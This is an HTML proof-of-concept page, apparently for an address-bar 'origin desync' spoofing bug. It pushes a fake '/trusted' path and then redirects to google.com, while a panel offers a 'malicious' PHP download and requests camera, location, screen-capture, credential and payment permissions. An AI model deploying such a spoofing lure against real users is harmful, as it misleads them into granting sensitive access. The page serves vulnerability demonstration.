<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

video { width:100%; margin-top:10px; }

pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:11px;
  max-height:260px;
  overflow:auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download file.php</div>

  <button class="download-button" onclick="downloadFile()">
    Download File (file.php)
  </button>

  <hr>

  <button onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <button onclick="callAllAPIs()">CALL ALL APIs</button>
  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  // Redirect to google.com after 80ms (simulating the origin desync)
  setTimeout(() => {
    location.href = 'https://google.com:9090';
  }, 80);
};

/* ====================== Functions ====================== */
function downloadFile() {
  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
  const fileUrl = URL.createObjectURL(fileBlob);

  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'file.php';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
}

function getLocation() {
  const output = document.getElementById('locationOutput');
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => output.textContent =
      `${pos.coords.latitude}, ${pos.coords.longitude}`,
    () => output.textContent = 'Permission denied'
  );
}

function openCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => document.getElementById('camera').srcObject = s)
    .catch(() => alert('Camera denied'));
}

/* ====================== Call APIs ====================== */
async function callAllAPIs() {
  // Geolocation API
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => alert("Geolocation: " + pos.coords.latitude + ", " + pos.coords.longitude),
      err => alert("Geolocation: Permission denied")
    );
  }

  // Fetch API
  try {
    const response = await fetch('https://jsonplaceholder.typicode.com/todos/1');
    const data = await response.json();
    alert('Fetch API: Data fetched successfully');
  } catch {
    alert("Fetch API: Error");
  }

  // Web Storage API
  try {
    localStorage.setItem('test', '1');
    sessionStorage.setItem('test', '1');
    alert("Web Storage API: OK");
  } catch {
    alert("Web Storage API: Error");
  }

  // Notification API
  if (Notification) {
    const permission = await Notification.requestPermission();
    alert("Notification: " + permission);
  }

  // Service Workers API
  if ('serviceWorker' in navigator) {
    try {
      await navigator.serviceWorker.register('/service-worker.js');
      alert("Service Worker API: Registered");
    } catch {
      alert("Service Worker API: Registration failed");
    }
  }

  // WebRTC API
  try {
    await navigator.mediaDevices.getUserMedia({ audio: true });
    alert("WebRTC API: OK");
  } catch {
    alert("WebRTC API: Permission denied");
  }

  // Web Bluetooth API
  if ('bluetooth' in navigator) {
    try {
      const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
      alert("Web Bluetooth API: OK");
    } catch {
      alert("Web Bluetooth API: Permission denied");
    }
  }

  // Device Orientation API
  if (window.DeviceOrientationEvent) {
    window.addEventListener('deviceorientation', (e) => {
      alert("Device Orientation: " + e.alpha);
    });
  }

  // Web Share API
  if (navigator.share) {
    try {
      await navigator.share({ title: "Test", text: "Check this out!", url: window.location.href });
      alert("Web Share API: OK");
    } catch {
      alert("Web Share API: Permission denied");
    }
  }

  // Web MIDI API
  if (navigator.requestMIDIAccess) {
    try {
      await navigator.requestMIDIAccess();
      alert("Web MIDI API: OK");
    } catch {
      alert("Web MIDI API: Permission denied");
    }
  }

  // Push Notifications API
  if ('PushManager' in window) {
    try {
      const permission = await Notification.requestPermission();
      alert("Push Notifications API: " + permission);
    } catch {
      alert("Push Notifications API: Permission denied");
    }
  }

  // Clipboard API
  try {
    await navigator.clipboard.writeText("Test Clipboard");
    alert("Clipboard API: OK");
  } catch {
    alert("Clipboard API: Permission denied");
  }

  // Screen Capture API
  try {
    await navigator.mediaDevices.getDisplayMedia();
    alert("Screen Capture API: OK");
  } catch {
    alert("Screen Capture API: Permission denied");
  }

  // Background Sync API
  if ('sync' in navigator) {
    try {
      await navigator.serviceWorker.ready.then(registration => registration.sync.register('sync_tag'));
      alert("Background Sync API: Registered");
    } catch {
      alert("Background Sync API: Error");
    }
  }

  // File System Access API
  if ('showOpenFilePicker' in window) {
    try {
      const fileHandle = await window.showOpenFilePicker();
      alert("File System Access API: File selected");
    } catch {
      alert("File System Access API: Permission denied");
    }
  }

  // IndexedDB API
  try {
    const request = indexedDB.open('testDB', 1);
    request.onsuccess = () => alert("IndexedDB API: OK");
    request.onerror = () => alert("IndexedDB API: Error");
  } catch {
    alert("IndexedDB API: Error");
  }

  // Web Speech API
  if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
    const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
    recognition.start();
    recognition.onresult = (event) => alert("Web Speech API: " + event.results[0][0].transcript);
    recognition.onerror = () => alert("Web Speech API: Error");
  }

  // Media Devices API
  try {
    await navigator.mediaDevices.enumerateDevices();
    alert("Media Devices API: OK");
  } catch {
    alert("Media Devices API: Error");
  }

  // Web Audio API
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    alert("Web Audio API: OK");
  } catch {
    alert("Web Audio API: Error");
  }

  // CSS Paint API (Not widely supported yet)
  if ('paintWorklet' in CSS) {
    alert("CSS Paint API: Supported");
  }

  // Device Memory API
  if ('deviceMemory' in navigator) {
    alert("Device Memory API: " + navigator.deviceMemory + "GB");
  }

  // Intersection Observer API
  try {
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => alert("Intersection Observer API: " + entry.isIntersecting));
    });
    observer.observe(document.querySelector('body'));
  } catch {
    alert("Intersection Observer API: Error");
  }

  // Broadcast Channel API
  if ('BroadcastChannel' in window) {
    const channel = new BroadcastChannel('test_channel');
    channel.postMessage('Hello from Broadcast Channel!');
    alert("Broadcast Channel API: Message sent");
  }

  // Payment Request API
  if ('PaymentRequest' in window) {
    try {
      const request = new PaymentRequest(
        [
          {
            supportedMethods: ['basic-card'],
            data: { supportedNetworks: ['visa', 'mastercard'] }
          }
        ],
        {
          total: { label: 'Total', amount: { value: '10.00', currency: 'USD' } }
        }
      );
      await request.show();
      alert("Payment Request API: Payment initiated");
    } catch {
      alert("Payment Request API: Error");
    }
  }

  // Credential Management API
  if ('credentials' in navigator) {
    try {
      const credential = await navigator.credentials.get({ password: true });
      alert("Credential Management API: Credential retrieved");
    } catch {
      alert("Credential Management API: Error");
    }
  }

  // WebAssembly API
  try {
    const response = await fetch('https://example.com/test.wasm');
    const bytes = await response.arrayBuffer();
    const wasmModule = await WebAssembly.instantiate(bytes);
    alert("WebAssembly API: Module loaded");
  } catch {
    alert("WebAssembly API: Error");
  }

  // Web Crypto API
  try {
    const key = await crypto.subtle.generateKey(
      { name: 'RSA-OAEP', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
      true, ['encrypt', 'decrypt']
    );
    alert("Web Crypto API: Key generated");
  } catch {
    alert("Web Crypto API: Error");
  }

  // Web Authentication API
  if ('PublicKeyCredential' in window) {
    try {
      const credential = await navigator.credentials.create({ publicKey: { rp: { name: 'Demo' }, user: { id: new TextEncoder().encode('user123'), name: 'user@domain.com', displayName: 'User' }, challenge: new Uint8Array([1, 2, 3]), pubKeyCredParams: [{ type: 'public-key', alg: -7 }] } });
      alert("Web Authentication API: Credential created");
    } catch {
      alert("Web Authentication API: Error");
    }
  }

  // HTML5 Drag-and-Drop API
  const dragElement = document.createElement('div');
  dragElement.setAttribute('draggable', 'true');
  dragElement.textContent = 'Drag me';
  dragElement.addEventListener('dragstart', () => alert('Drag-and-Drop API: Drag started'));
  document.body.appendChild(dragElement);

  // Resize Observer API
  const resizeObserver = new ResizeObserver(entries => {
    entries.forEach(entry => alert("Resize Observer API: Element resized"));
  });
  resizeObserver.observe(document.querySelector('body'));
  
  // HTML5 Canvas API
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  context.fillStyle = 'red';
  context.fillRect(0, 0, 50, 50);
  alert("HTML5 Canvas API: Canvas created");

  // Fullscreen API
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
      alert("Fullscreen API: Entered fullscreen");
    } catch {
      alert("Fullscreen API: Failed to enter fullscreen");
    }
  }
}
</script>

</body>
</html>
